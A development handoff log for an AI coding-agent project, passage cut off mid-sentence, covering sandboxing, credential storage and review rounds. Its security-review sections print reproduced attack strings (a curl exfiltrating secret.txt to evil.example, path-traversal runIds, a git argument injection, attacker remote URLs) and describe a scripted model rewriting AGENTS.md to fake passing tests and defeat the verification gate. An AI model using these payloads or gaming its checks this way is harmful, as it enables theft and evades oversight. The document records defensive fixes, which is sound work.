# HANDOFF

Living continuation document for ClutchCode. Read this first every
session; update it before you stop. See `CLAUDE.md` for timeless working
conventions (build/test/lint, testing philosophy, quality bar) — this
file is the time-stamped snapshot of where the project actually stands.

**Snapshot as of:** 2026-08-21
**Branch:** `claude/start-work-handoff-referral-52eyj1`
**Latest commit:** `ab8df41` — "docs: evaluate the pi agent harness — latent pause_turn gap, plus a provenance correction"
**Test suite:** 687/687 passing, 76 test files, clean `tsc -b`, clean `eslint .`

**PR:** none opened yet for this branch — PR #12 (the prior branch) merged
cleanly, as did #4–#11 before it. Pattern established across every phase so
far: one PR per phase of work, never reused once merged, branch always
restarted from `main`'s merged tip before new commits land on it. This
session's work is pushed to the branch above; open a PR from it when
ready.

---

## What's done

### Phase 1 — minimal agent (baseline)
Single agent, OpenAI-compatible + Anthropic + Ollama providers,
`RunState` machine, native tools (fs/shell/search/tests), SEARCH/REPLACE
edit cascade with fallback, git worktree isolation, deterministic
build/test verification, terminal CLI, the Agent API in-process boundary,
the runtime-replay test harness + `FakeProvider` + redaction canary.

### Phase 2 items landed early
- **Capability probe, context budgeter, edit-format selector** (§4.9,
  §4.5, §4.4) — the adaptation layer's "crown jewel." Standalone tested
  package, wired into the live `AgentLoop`: a run picks up a probed
  model's profile automatically, system-prompt edit-format guidance
  follows `select_edit_format`, `maxOutputTokens` follows the
  reserved-output budget, conversation history compacts (turn-safe) once
  the effective-context budget is exceeded. **Not yet enforced:**
  dedicated repo-map/open-file-window budgets (§9, §4.5) — that subsystem
  doesn't exist before Phase 7, so its share is folded into the live
  history budget for now.
- **`agent resume` hardened** (§6.2, §6.3, §18.2) — a paused run persists
  its full redacted conversation transcript; `resume --extend-steps N`
  (also `--extend-wallclock-ms`/`--extend-tokens`/`--extend-cost-usd`)
  reconstructs the loop from that transcript and actually continues it,
  not just re-attaches and reports status.
- **OS keychain credential storage** (§5.1 tier 1) — see "OS keychain"
  below.

### Phase 5 — git edge cases (§13.4/§13.5)
Submodule writes ask for explicit approval instead of silently landing in
the run's commits; LFS-tracked writes/edits are flagged (`lfsTracked`);
`read_file` recognizes LFS pointer stubs and refuses real binary content;
`agent run --scope path/` pins verification to a monorepo subdir; `agent
checkpoints`/`agent rollback` expose checkpoint history at the CLI; `agent
pr` pushes a run's branch and opens a PR via `gh` (falling back to a real
GitHub compare URL, or just confirming the push). A real bug got fixed
along the way: `approve --squash`'s final commit was bypassing the user's
pre-commit hooks the same way internal checkpoints correctly do — fixed,
tested with both a rejecting and a passing hook script.
**Deliberately not attempted:** a full non-git (snapshot-backed)
`AgentLoop` execution path — `agent run` now fails with a clear "run git
init" error instead of a confusing git error three calls deep, but a
parallel non-git path is a distinctly larger, separate project.

### Phase 3 — OS sandbox Tier 1 (§12.5/§12.6)
`shell` runs under real OS confinement by default when available.
**Linux: runtime-verified.** `bubblewrap` was installed into this
environment specifically to make this real — a test suite writes a file
outside the workspace and asserts a sandboxed `cat` of it fails, asserts a
network fetch inside the sandbox is unreachable, asserts the real CLI
binary's own `npm test` run still passes confined. **macOS (Seatbelt/
`sandbox-exec`): written, not runtime-verified** — authored against the
documented SBPL grammar, structurally tested (balanced parens, expected
clauses), but has never run against a real `sandbox-exec` — no macOS host
exists in this environment. `agent.toml`'s `policy.sandboxTier = "tier0"`
is the documented escape hatch; `agent doctor` reports the active backend.
**Seccomp hardening (§12.6) is now layered under bwrap on x86_64 Linux:**
a classic-BPF filter, hand-assembled in TypeScript (zero new runtime
dependency), denies ~22 syscalls a dev workflow never needs but that are
sandbox-escape/privilege-escalation primitives (`ptrace`, `mount`, `bpf`,
`unshare`, `kexec_load`, kernel module load/unload, etc.) — proven
end-to-end against the real kernel: a real bwrap-sandboxed process
invokes each by number and gets EPERM, a control run without the filter
proves the same syscall succeeds unfiltered. **Landlock is explicitly
not attempted** — a wrong Landlock rule fails by silently granting *more*
access, a worse mistake category than seccomp's fail-loud one, with no
vetted library and no safe way to verify a hand-rolled one here.
**arm64 seccomp isn't supported either** — different syscall numbers, no
arm64 host to verify them against, reported honestly rather than guessed.
**Not yet layered in:** Landlock itself, a Windows Tier 1 backend (WSL2
is the spec's own recommended path there).

### Phase 4 — VS Code extension (§18.1/§18.5)
New `@clutchcode/agent-rpc` package: the Agent API's second binding
(alongside in-process) — LSP-style framed JSON-RPC 2.0 over stdio,
`run/status/listRuns/diff/approve/reject/resume/inspect/checkpoints/
rollback/pr` mapped onto a real `Agent`, runtime events forwarded as
`clutchcode/event` notifications. `clutchcode serve` runs it over real
stdio. `apps/vscode` is a thin client: `runTask.ts`/`connection.ts`/
`presentation.ts` hold all orchestration with zero `vscode` import, proven
by real tests (a real `Agent` behind a real `AgentRpcClient` over
`PassThrough` streams; a separate test spawns the actual compiled
`clutchcode serve` binary as a child process). **`extension.ts`
(the `vscode`-API glue) type-checks against `@types/vscode` but has never
run in a real VS Code extension host** — flagged in a header comment and
in `apps/vscode/README.md`. **Not yet built:** a native two-sided diff
view (currently a single read-only diff-highlighted document), a
run-picker instead of typing a run id, resume/rollback/pr in the
extension UI (the CLI has them; the extension covers §18.5's core
run/diff/approve/reject loop).

### Credential storage — §5.1, all three tiers done
`loadCredentials()` implements the real precedence chain (OS keychain →
encrypted file store → env vars) and backs every real call site
(`Agent.run`, the capability probe, `agent providers`, `agent doctor`).
**Tier 1, OS keychain — Linux: runtime-verified** against a real
freedesktop Secret Service — `secret-tool`/`libsecret`/`gnome-keyring`
were installed into this environment specifically for this; a throwaway
D-Bus session + keyring per test run proves store/get/clear and that a
keychain-stored credential genuinely wins over the same-named env var.
**macOS (`security` CLI) and Windows (DPAPI via PowerShell): written, not
runtime-verified** — same disclosed-gap pattern as Seatbelt, argv/script
shape directly asserted in tests via pure builder functions. **Tier 2,
encrypted file store** (`~/.config/clutchcode/credentials.age`, used only
when tier 1 reports no keychain backend at all — headless Linux, some
Profile-D servers): AES-256-GCM via Node's built-in `crypto`, keyed by a
locally generated, permission-protected "machine key" file plus an
optional passphrase (scrypt). Documented scoping decision: not
byte-compatible `age`-format (that would need a from-scratch
reimplementation of age's wire format to matter) — a real, correct,
dependency-free AEAD doing the same job instead. Needs no OS binary, so
unlike tier 1 it's uniformly verified everywhere: round-trip, wrong
passphrase and tampered-ciphertext failing closed, two different machine
keys never cross-reading each other's values. `agent providers set-key
<anthropic|openai-compatible>` reads the key from stdin (never argv/
history) and routes to whichever tier is actually available; `agent
providers unset-key <provider>` removes it from the same place.

### Project memory correction UX (§10.3) — new @clutchcode/memory package
Toolchain detection now persists as a provenance-timestamped cache
(`{value, derivedAt, source}` per fact), keyed by the repo's *stable*
path — every run used to call `detectToolchain` fresh, so caching at all
is a real behavior change. Invalidated when the manifest files it was
derived from change content; `AGENTS.md` overrides still win on every
re-derive. `agent memory list/show/forget/correct` expose it at the CLI.
**Self-healing (§10.3 point 3):** a real bug got fixed along the way —
`classifyFailure` used to trust `lint`/`typecheck`'s own stage name
unconditionally, so a missing `eslint`/`tsc` binary was misreported as
"there's a lint issue" instead of what it is; new `command-not-found`
classification (exit 127, checked first) fixes this for all four stages,
and `AgentLoop`'s new optional `onVerificationFailure` hook (runtime
stays decoupled from the memory package) lets `agent-api` mark the
matching cached fact stale so the next run re-derives instead of
repeating a proven-wrong command. Proven end-to-end through a real run,
not just at the unit level — including a real bug the test suite itself
caught (see gotchas below). Deliberately out of scope: the "agent
proposes an `AGENTS.md` edit, with consent" flow §10.1 also describes,
and the long-term engineering tier (prior runs/decisions queryable via a
history database) — both real, separate features.

### Workflow Engine (§8.2) — the three Phase 1 built-ins, load-bearing
`RunState.workflowId` existed since early in the project (default:
`"default"`) but nothing ever read it — a stored label with zero effect
on control flow, called out explicitly (and corrected) in an earlier
version of this file's "what's left" table. It's now real: `agent run
--workflow <default|quickfix|review-only>` selects one of three
behaviorally distinct pipelines, implemented as concrete branches in
`AgentLoop` gated on `state.workflowId` (Option B from §8.1's comparison —
additive TS code paths, not a generic stage-pipeline interpreter; that
interpreter plus the JSON-Schema-validated user-declarative layer on top
of it is explicitly deferred, see "what's left"). `default` is byte-for-
byte the pre-existing baseline. `quickfix` forces the §6.7 planning
heuristic off unconditionally — proven by running the *same* ambiguity-
tripping task description through both workflows and asserting `PLANNING`
fires for one, not the other. `review-only` is the interesting one:
`write_file`/`edit_file` are filtered out of a new `effectiveTools` map
that backs *both* the tool schema sent to the model and the dispatch
table `runToolCall` actually executes against, so a model that tries to
edit anyway (tested directly, not just inferred) gets a real
`unknown-tool` error rather than a silent no-op — defense in depth, not
just hiding the schema. It finishes by capturing the model's last reply
into `RunState.summaryCheckpoints` (a field that existed, unused, since
the original RunState design) as the "report" and transitioning straight
to `DONE`, skipping verify/approve/commit — needed one small, narrowly-
justified state-machine addition (`ACTING → DONE`, only reachable from
`finishReviewOnly()`; every other workflow's edges are unchanged).
Unknown `--workflow` values are rejected at the `Agent.run` boundary with
a clear error listing the valid ids, matching the existing "not a git
repo" fail-loud style. 14 new tests across `workflow.test.ts` (registry
shape), `run-state.test.ts` (the new edge + `workflowId` defaulting),
`agent-loop.test.ts` (quickfix vs. default planning contrast, review-only
schema filtering, review-only edit-attempt refusal + report capture), and
`agent.test.ts`/`commands.test.ts` (real end-to-end through the Agent API
and CLI boundaries, plus the unknown-id rejection).

### Code-review pass over this session's own work — three real bugs found and fixed
Ran the `code-review` skill at `high` effort against the full diff since
the seccomp commit (everything built this session: §10.3 memory, §8.2
workflow engine, §18.5 VS Code polish, §8.1 declarative workflows). Three
findings, all verified for real (not taken on faith) before fixing:

1. **`diffFilesAgainstBase` mis-detected a renamed binary file as text.**
   `git diff --numstat -M` combines a rename's two paths into one string
   — confirmed empirically with three throwaway repos: `"old =>
   new"` when the paths share no directory, `"dir/{old => new}"` when
   they do. The original implementation matched a `Set<string>` of
   binary paths (from one bulk `--numstat` query) against the
   individually-parsed `path`/`oldPath` from `--name-status` — never
   matches a combined rename string, so the binary flag silently stayed
   `false` for a renamed binary file with real content changes, and
   `git show`/`fs.readFileSync(...,"utf8")` would have read raw binary
   bytes as text, producing mojibake in the new VS Code diff view. Fixed
   by scoping the numstat binary check to one explicit pathspec per
   file — verified this suppresses the combining entirely (git only
   condenses rename paths when a diff query spans more than the single
   path it's asked about). New test constructs exactly this scenario
   (a binary file, committed, then renamed with a small — not total —
   content change so git's rename-similarity heuristic still detects
   it as a rename) and — checked by literally reverting the fix and
   re-running — fails against the old code, passes against the new.
2. **`classifyFailure`'s `command-not-found` fallback misclassified
   ordinary missing-file errors.** The text-pattern fallback (behind
   exit-code-127, the primary/reliable check) included a bare `"no such
   file or directory"` — precisely the phrase Node's own generic
   `ENOENT` uses for *any* missing file, not just a missing shell
   command. A real test failure like `Error: ENOENT: no such file or
   directory, open '/repo/fixtures/data.json'` (a genuinely fixable bug —
   wrong fixture path) would have been misclassified as
   `command-not-found`: the repair message would tell the model to stop
   calling tools and escalate instead of asking for a targeted fix, and
   `markToolchainFactStale` would incorrectly invalidate a perfectly
   valid cached command. Fixed by only trusting the bare phrase when the
   output *isn't* Node's own `ENOENT`-labeled wording (a shell's own
   exec-failure message for a truly missing command never includes that
   label — only Node's generic file error does). Two new tests: the
   legitimate shell case still classifies as `command-not-found`; the
   Node-ENOENT-for-an-ordinary-file case now doesn't.
3. **`agent memory` commands had no way to see a scoped run's memory at
   all.** `Agent.run --scope path/` (§13.4) caches toolchain memory under
   `<repoPath>/<scope>`, computed once inline in `agent.ts`; `agent
   memory list/show/forget/correct` (§10.3) only ever took a bare
   `repoPath` with no scope parameter and no `--scope` CLI flag —
   structurally incapable of reading or correcting a scoped run's cache,
   not just missing a flag. `agent memory list` after a scoped run
   reported "nothing remembered" even though a fact genuinely was
   cached, and `agent memory correct` for a scoped run silently wrote to
   a different, unused cache file. Fixed by threading `scope` through
   all four `@clutchcode/agent-api` memory functions and adding
   `--scope` to the CLI's `memory`/`list`/`show`/`forget`/`correct`
   subcommands; extracted one shared `resolveMemoryCacheKeyPath(repoPath,
   scope)` helper used by both `memory.ts` and `Agent.run` itself so the
   two computations can't drift apart again the way this bug happened in
   the first place (two separate ad-hoc computations of the same key).
   Four new tests across `agent.test.ts` (scoped vs. unscoped `listMemory`/
   `correctMemoryFact` through the real `Agent` boundary) and
   `commands.test.ts` (the same through the real CLI command functions).

7 new tests total. Full suite after all three fixes: 595/595 passing,
clean `tsc -b`, clean `eslint .`. Nothing here should be read as "the
review found only three things" — it's a single-pass, single-reviewer
review; the honest claim is "these three were confirmed real and fixed,"
not "this code is now bug-free."

### §8.1 user-declarative workflow layer — real JSON-Schema validation via `ajv`
The second authoring layer §8.1 describes, on top of the three built-ins
(previous entry). New `packages/runtime/src/workflow-declaration.ts`:
`{apiVersion: "clutchcode/v1", id, name, stages: [{id, uses, when?,
params?}]}`, `uses` restricted to the five stage kinds `AgentLoop`
actually knows about (`plan`/`implement`/`verify`/`approve`/`commit`).
Chose a real dependency (`ajv`, ~4 small transitive deps, added to
`@clutchcode/runtime`) over hand-rolling a JSON-Schema validator — the
spec explicitly says "JSON-Schema-validated," and a hand-rolled structural
check dressed up as one would be a real gap dressed as done, not what
this project's honesty rule allows. A hit an ajv+TypeScript
`NodeNext`-resolution gotcha along the way: `import Ajv from "ajv"`
type-errors ("not constructable") under this repo's `moduleResolution:
NodeNext`; ajv's package also exports the class by name, so `import {
Ajv } from "ajv"` sidesteps the broken default-export interop path
entirely — preserved as a gotcha below.

Deliberately **not** a general stage-pipeline interpreter — §8.1's own
"no arbitrary control flow" line, taken literally. Structural JSON-Schema
validation is real (via ajv), but a declaration only *resolves* to
something `AgentLoop` can execute if it matches one of exactly two
shapes: a "full" pipeline (`implement` + `verify` required, `plan`
optional with `params.mode: "auto"|"always"`) or a "readonly" one
(`implement` alone, `params.readonly: true`, mirroring `review-only`).
Anything else — verify without implement, two `plan` stages, a readonly
implement combined with other stages — is rejected with a specific error
naming exactly what's unsupported, not silently misinterpreted.

`AgentLoop` was refactored to stop comparing `state.workflowId` against
hardcoded strings and instead consume a resolved `WorkflowPlan`
(`{planMode: "auto"|"always"|"never", readonly: boolean}`) — the built-ins
now resolve to this same shape via `resolveBuiltinWorkflowPlan`, so
`AgentLoop` genuinely never needs to know whether a run is on a built-in
or a custom workflow. Proven directly: a test constructs `AgentLoop` with
a `workflowPlan: {planMode: "always", readonly: false}` and an
unrecognized `workflowId`, and shows planning fires unconditionally even
for a task the §6.7 heuristic would call simple — a real capability none
of the three built-ins express (`default` defers to the heuristic,
`quickfix` always skips).

**A real correctness question this surfaced, and how it's resolved:**
what happens if a paused run's custom workflow *file* is deleted or
changed before `resume()`? Re-reading it at resume time would be wrong —
resumability (§6.2) means the run continues as it started, not as
whatever the file currently says. Fixed by persisting the *resolved*
`WorkflowPlan` on `RunState` itself (`state.workflowPlan`, always set by
`createRunState`, round-trips through JSON exactly like
`budgets`/`consumed` already do) instead of only the workflow id.
`resume()` never touches the filesystem for this. Proven end to end: a
test pauses a run on a custom readonly workflow, deletes the declaration
file, resumes, and confirms the run still finishes via the readonly path
with zero verification — the deleted file genuinely never gets re-read.

`agent run --workflow-file <path.json>` wires it at the CLI;
`--workflow`/`--workflow-file` are mutually exclusive (checked at
`Agent.run`'s boundary, not left to whichever the CLI happened to pass
last). Not built: the dedicated `agent workflow` CLI command (§18.2 marks
that Phase 2) — see "what's left".

19 new tests in `workflow-declaration.test.ts` (schema + semantic
validation, `resolveWorkflowPlan`, real file I/O), 2 new in
`agent-loop.test.ts` (the novel `planMode: "always"` proof + the
unrecognized-id defensive-fallback proof), 2 new in `run-state.test.ts`
(`workflowPlan` resolution + explicit override), 4 new in `agent.test.ts`
(real end-to-end run, invalid-file rejection, mutual-exclusivity
rejection, the delete-then-resume proof), 3 new in `commands.test.ts`.

### VS Code extension polish (§18.5) — native diff, run-picker, resume/rollback/pr
Three items from the extension's original "not yet built" list, all real
and tested at the layer that can be:
1. **Native two-sided diff view.** New `@clutchcode/git` function
   `diffFilesAgainstBase(run, pathScope?)` returns per-file
   `{path, status, before, after, binary}` — real before/after content, not
   unified-diff text — a separate function from `diffAgainstBase` on
   purpose (that one stays a single cheap `git diff` call for callers that
   only ever wanted text, like `agent pr`'s body). It needed two real fixes
   discovered by the tests themselves: `git diff <commit>` never reports an
   untracked path *at all*, no matter what it's diffed against — a
   brand-new file the model just wrote would silently vanish — fixed by
   staging first (`git add -A`, the same thing `checkpoint()` already did
   per step, not a new side effect); and rename detection (`-M`) isn't on
   by default for `git diff` across git versions, so a rename would report
   as an unrelated delete+add without it. Wired through
   `Agent.diffFiles(runId)` and a new `diffFiles` RPC method the same way
   `diff`/`diffStat` already were. `extension.ts` opens one real
   `vscode.diff` editor per changed file (virtual documents served from a
   `TextDocumentContentProvider`, keyed so the file's real extension still
   drives syntax highlighting on both sides), replacing the single
   unified-text document it used to open; binary files are skipped with a
   note instead of shown as mojibake.
2. **A run-picker.** New `pickRun()` in `runTask.ts` fetches the real run
   list over RPC (`listRuns`, already existed, was unused by the
   extension), filters it per command (e.g. only `PAUSED` runs offered to
   `clutchcode.resume`), and hands the picking itself to `ui.pickRun` —
   `extension.ts` implements that with a real `vscode.window.showQuickPick`
   showing status + task per run; tests implement it with a scripted
   choice. Replaces the old free-text "type a run id" input box on every
   command.
3. **resume/rollback/pr commands in the UI.** New `resumeTask`/
   `rollbackTask`/`prTask` orchestration functions, following the same
   split `runClutchCodeTask` already established (no `vscode` import,
   tested against a real `Agent` behind a real `AgentRpcClient`).
   `handlePostRunState` was pulled out of `runClutchCodeTask` so `resumeTask`
   shares the exact same "show diff → ask approve/reject" logic a fresh run
   uses, instead of a second copy of it. `resumeTask` without an explicit
   step extension re-pauses immediately — that's `Agent.resume`'s own
   documented no-op semantics (§6.3), already true of the CLI, not new
   behavior invented here; the extension's resume command prompts for an
   extension amount rather than guessing a default.

`extension.ts` itself remains the one file in this package that's
type-checked-but-not-runtime-verified (no real VS Code extension host in
this environment) — unchanged honesty boundary from Phase 4, just a larger
file behind it now. 10 new/rewritten tests in `runTask.test.ts` (all
against a real `Agent` over real `PassThrough`-piped RPC, including a real
scripted-tool-call edit for the diff-content and rollback tests) plus 5 new
`presentation.test.ts` cases for the two new pure formatters
(`formatDiffTabTitle`, `formatPrResult`), and 7 new `worktree.test.ts`
cases for `diffFilesAgainstBase` itself (added/modified/deleted/renamed/
binary/multi-file/pathScope).

### Docs: "MVP" removed everywhere
The spec used "MVP" to label Phase 1 scope throughout — renamed to
"Phase 1" (or a non-numeric label where it would collide with the
roadmap's own independent Phase 1–11 numbering), because this ships as a
real product built in phases, not a minimum-viable throwaway. Touched
`PROJECT_SPEC.md` (44 occurrences), `README.md`, `docs/PRIOR_ART.md`,
three `research/` notes, and doc comments in five packages. Pure rename,
zero behavior change.

### Full-history security review — six vulnerabilities + two correctness bugs found and fixed, one false positive rejected
Requested as "review everything, security plus like all, till now" — not
scoped to a single diff. Ran the `security-review` skill's own described
methodology (parallel finder subagents fanned out by subsystem — redaction/
transcript persistence, policy/approval engine, git worktree + remote
handling, tool argument construction, sandbox temp-file handling — then a
parallel false-positive-filter subagent per finding, confidence ≥8 kept),
personally orchestrated via the `Agent` tool since the skill's own `git
diff origin/HEAD...` auto-detection had nothing to diff against (everything
prior was already merged). Every finding was independently reproduced in a
real throwaway repo/fixture before being trusted — the session's standing
"verify before fixing" discipline, applied here at larger scale than any
prior round:

1. **§5.2 redaction bypass in `AgentLoop`'s `model.response` event.**
   `state.messages` (and the transcript it feeds) already redacted the
   model's own reply text via `pushMessage`, but the `model.response`
   *runtime event* — a separately persisted artifact, written verbatim to
   `<stateDir>/runs/<runId>/events.jsonl` by `agent-api`'s `appendEvent` —
   used the raw, unredacted `response.text` directly. A model quoting a
   secret it had just read back (e.g. summarizing a `.env` it opened)
   would leak it into that log regardless of the transcript being clean.
   Reproduced with a `FakeProvider` turn that echoes the redaction canary
   in its reply text and asserting the emitted event; the pre-fix version
   fails this assertion (confirmed via `git stash`). Fixed by scrubbing
   `response.text` through the existing `Redactor` before emitting the
   event — `state.messages` still gets the raw text, unchanged. Also
   extended `evals/src/redaction-canary.test.ts`'s full-stack SSE-scripted
   integration test to have the model's own final reply echo the canary
   too, since the original test only injected it via a tool-call argument
   and would never have caught this specific gap.
2. **§12.2 approval-memoization bypass in the shell tool.**
   `PolicyEngine.decide()` memoizes non-destructive `ALLOW` decisions per
   `commandClass` for a run's lifetime (the "approval fatigue" mitigation)
   — `commandClassOf` derived that class as just the first two
   whitespace-split tokens, with no check for shell metacharacters.
   Reproduced for real: approve `"npm test"` once via
   `ctx.policy.remember("npm test", "ALLOW")`, then attempt `"npm test &&
   curl http://evil.example/x --data-binary @secret.txt"` — pre-fix, this
   is silently allowed with no prompt, because both strings share the same
   first two tokens. Fixed by having `commandClassOf` fall back to the
   *full* trimmed command as its own class whenever it contains a shell
   metacharacter (`; & | \` < > \n` or `$(`), tested directly against all
   of those plus a literal newline, so a compound command can never ride
   in on a simple command's remembered approval.
3. **§13.1 `runId` path traversal in `createRunWorktree`.** The `runId`
   is joined straight into `<stateDir>/wt/<runId>` with no validation, and
   it's attacker/model-reachable over the real JSON-RPC `run` method
   (`agent-rpc`'s untrusted-input boundary), not just an internal ID.
   Reproduced by calling `createRunWorktree` directly with `runId:
   "../../../../../../tmp/pwned-worktree"` (confirmed pre-fix it resolves
   clean out of `<stateDir>/wt/` via ordinary `path.join` `..`
   normalization — no error, no containment check) and separately end-to-
   end over the real `agent-rpc` client/server pair. Fixed with a strict
   `^[A-Za-z0-9_-]+$` allow-list on `runId` plus a defense-in-depth
   `path.relative`-based containment check on the resolved path. New tests
   at both the `worktree.ts` unit level (four `runId` values, three
   throwing, one legitimate one not) and the `agent-rpc` integration level
   (the exploit string rejected over the real RPC boundary, target
   directory confirmed never created).
4. **Git-log argument injection → arbitrary file write.** The `git`
   tool's `log` op built its args as `` [`-${args.arg ?? "10"}`,
   "--oneline"] `` — reproduced by constructing a real git repo and
   calling `gitTool.run({ op: "log", arg: "-output=/tmp/x" })`: git parses
   the code's own leading `-` plus the arg's own leading `-` as a `--`
   long option, so this genuinely creates `/tmp/x` via git's `--output`
   flag (first reproduction attempt without the arg's own leading dash
   failed with "unrecognized argument" — the double-dash mechanism only
   triggers when the *arg itself* starts with `-`). Fixed by only ever
   accepting a bare non-negative integer count for `arg` (validated by
   regex) and passing it as `git log -n <count>`, falling back to the
   default `10` for anything else — no string interpolation into a
   dash-prefixed position at all anymore.
5. **Unvalidated git `remote` parameter in `remoteUrl`/`pushBranch`.**
   Any string was accepted as a "remote name" and passed straight to
   `git`, with no check that it's an actual configured remote rather than
   a URL or transport string — a push-destination-redirection/
   exfiltration risk (a value like `https://attacker.example/evil.git` or
   `git@attacker.example:evil/repo.git` would be used as-is). A subagent
   initially flagged this as default-on RCE via `ext::<command>`;
   investigated and downgraded rather than taken at face value —
   `git push -u "ext::sh -c '...'" main"` against a real throwaway repo
   returned `fatal: transport 'ext' not allowed`, because git's actual
   default for `protocol.ext.allow` specifically is `never` (not the
   general `user` default that applies to *other* unlisted protocols, as
   the subagent had claimed). The underlying unvalidated-parameter issue
   is still real and worth closing on its own merits, just correctly
   framed as redirection/exfiltration risk rather than default-on RCE.
   Fixed with a strict `^[A-Za-z0-9_.-]+$` remote-name allow-list,
   rejecting anything that looks like a URL or transport string; tested
   against all three example payloads plus confirming `"origin"` still
   works.
6. **Predictable seccomp filter temp-file path.**
   `ensureSeccompFilterFile` wrote the compiled BPF filter to a fixed,
   predictable filename in the shared system temp directory — a co-
   resident local user could pre-plant a symlink there ahead of the
   write. Fixed by writing into a freshly `fs.mkdtempSync`'d (POSIX-
   guaranteed mode-0700) subdirectory via `O_WRONLY|O_CREAT|O_EXCL`, so
   the write structurally refuses to follow a pre-existing symlink or
   file at the target path — proven both by asserting the new path shape
   (fresh random subdirectory, mode 0700) and by directly exercising the
   `O_EXCL` primitive against a deliberately pre-planted symlink.
7. **Edit-cascade leading-`...` ellipsis-elision bug** (correctness, not
   security, caught along the way). A SEARCH block that opens with its
   own `...` line — eliding everything before the first real anchor —
   was rejected unconditionally, no matter how well the rest matched.
   `applyEllipsisSegments` only ever set `firstMatchIdx` on loop index
   `0`, but a leading ellipsis makes segment `0` the empty elided segment,
   which hits the `seg.length === 0` branch and `continue`s straight past
   that assignment — so `firstMatchIdx` stayed `-1` and the whole edit
   was reported as "SEARCH block did not match" regardless of what
   followed. Fixed by setting `firstMatchIdx` on the first segment that
   actually matches content, not the first segment by index. New test
   uses the same fixture as the existing passing ellipsis test, with the
   SEARCH block starting directly on `...`.
8. **Toolchain-memory `correctToolchainFact` stale-hash bug**
   (correctness, directly violates §10.3 point 4, "human edits win").
   A human correction (`agent memory correct`) reused the cached record's
   existing `manifestHash` verbatim. If that hash was already stale (e.g.
   `package.json` had been edited since the last derive, before the
   correction ran), the very next `getOrDetectToolchain` call would see
   the mismatch, conclude the whole record untrustworthy, and silently
   re-derive from scratch — discarding the human's correction with no
   warning. Reproduced by editing `package.json` between the initial
   derive and the correction, then confirming the correction didn't
   survive the next cache-hit read (pre-fix). Fixed by always stamping
   the *current* manifest hash (recomputed on the spot) whenever a
   correction is written, not just when creating a brand-new record.

608 total tests after all eight fixes (up from 595), clean `tsc -b`,
clean `eslint .`. Six of the eight fixes (everything except the remote-
name validator and the seccomp path fix, whose correctness follows
directly and unambiguously from their own assertions with no ambiguity
to double-check) were verified with the full rigor cycle: `git stash
push -- <file>` to revert just the fix, rerun the new test and confirm
it fails, `git stash pop` to restore it, rerun and confirm it passes.
As with the prior code-review pass: this is a single review round, not
a bug-bounty-grade exhaustive audit — the honest claim is "these eight
were confirmed real (or, for the ninth, confirmed *not* real) and
fixed/corrected," not "this codebase now has zero security issues."

### Round 3 — full-codebase security + correctness review, every package not yet reviewed
Requested as "fix everything and do another round." Fanned out 9 parallel
subagents (`Agent` tool, `general-purpose`, background) across every
package the first two rounds hadn't touched: agent-rpc (the untrusted RPC
boundary), credentials/keychain/config, all tool implementations,
sandbox/policy/redaction, the rest of the git package, the runtime/
workflow engine, provider adapters, the CLI + VS Code extension, and
capability/verification (including cheat-detection — the layer that
exists specifically to catch a model gaming the deterministic gate). One
agent (sandbox/policy) hit a session API limit mid-run and never
completed — genuinely not reviewed this round, listed under "what's
left." The other 8 returned, in total, ~25 candidate findings; 18 were
independently reproduced for real and fixed, each with a new regression
test, 16 of the 18 verified with the full `git stash` revert-and-recheck
cycle (the CLI fixes and the VS Code `package.json` scope fix are the two
whose correctness is unambiguous from their own assertions — spawning the
real compiled binary and reading the raw JSON schema respectively, no
ambiguity to double-check). A handful of git-worktree/dirty-tree
correctness findings were confirmed real but deferred — see "what's
left."

**Most severe, in order:**

1. **§13.1 `runId` path traversal beyond `createRunWorktree`** — round 2
   validated `runId` only at worktree *creation*; three independent
   subagents (credentials, runtime, agent-rpc audits) converged on the
   same finding: every *read/mutate* path — `RunStateStore.load/save/
   delete`, `worktree-store.ts`'s `loadRunWorktree`/`saveRunWorktree`,
   `events.ts`'s `appendEvent`/`readEvents`, and `agent-rpc`'s
   `requireRunId` — built a path from a caller-supplied `runId` with zero
   validation, reachable via `diff`/`approve`/`reject`/`resume`/`inspect`/
   `checkpoints`/`rollback`/`pr`, several of which chain into real,
   destructive `git` operations (`reset --hard`, `clean -fd`, `worktree
   remove --force`) against whatever `worktreePath` a traversed-to file
   happened to name. Fixed by extracting one shared validator
   (`assertSafeRunId`, `@clutchcode/git`'s new `run-id.ts`) and wiring it
   into every one of those choke points, plus the RPC boundary itself as
   defense-in-depth — this is also the concrete story behind the new
   "fix the class, not the instance" convention in `CLAUDE.md`.
2. **Workspace-path symlink escape** — `resolveInWorkspace` (used by
   `read_file`/`write_file`/`edit_file`) decided "inside the workspace"
   by pure string-prefix matching on `path.resolve()` output, never
   resolving a symlink. A symlinked directory inside the workspace
   pointing outside it (checked into a repo, or created via `shell`
   earlier in the same run) made `inside: true` — reproduced for real: a
   `write_file` through such a symlink genuinely wrote outside the
   workspace, with the `PolicyEngine` granting a bare `ALLOW` and no
   approval prompt at all, since the flag it decides on was already
   wrong. Same mechanism gives `read_file` an arbitrary-file-read
   primitive. Fixed by resolving the real path of the deepest *existing*
   ancestor (the leaf usually doesn't exist yet — that's the whole point
   of `write_file`) and checking containment against that.
3. **AGENTS.md override trust boundary (§10.3 point 4)** — `agentsMdContent`
   was read from the *live* worktree, which the model itself is actively
   editing. Reproduced precisely: a scripted model turn writes `AGENTS.md`
   with `test: echo pwned-cheat-passed` plus an unrelated `package.json`
   touch (needed to invalidate `computeManifestHash`'s cache — the exact
   two-file mechanism the review flagged), the run pauses on its step
   budget, and a subsequent `resume()` — which re-derives toolchain
   commands from the now-modified worktree — genuinely ran the fake
   `echo` command instead of the real, failing root test and reached
   `DONE` with the broken build auto-committed (`--yes` mode). This is a
   full bypass of the deterministic verification gate the whole project
   is built around. Fixed by reading `AGENTS.md` from the run's *base
   commit* (`git show <baseCommit>:AGENTS.md`) instead of the live
   worktree — an override only takes effect if it existed before this
   run's own edits, which is what "human-authored" actually means here.
4. **Cheat-detection gaps** (`packages/verification/src/cheat-detection.ts`,
   the layer that exists specifically to catch a model gaming the
   deterministic gate) — four separate, independently-reproduced holes: a
   bare `catch {}` (ES2019+ optional catch binding, no parens) wasn't
   matched by the swallowed-error regex, which required `(...)`; the
   trivial-assertion detector only recognized literal `true`/`1==1`
   shapes, missing e.g. `expect(1).toBe(1)`; `checkHardcodedOutput`'s
   `<=2` added-line threshold counted comment lines, so two harmless
   `// comment` lines padded past a real hardcoded-literal collapse
   undetected; and `checkSnapshotEdit`'s "there's a source rationale"
   exemption fired for *any* other non-test file changed anywhere in the
   diff, not one actually related to the snapshot's subject. Fixed with a
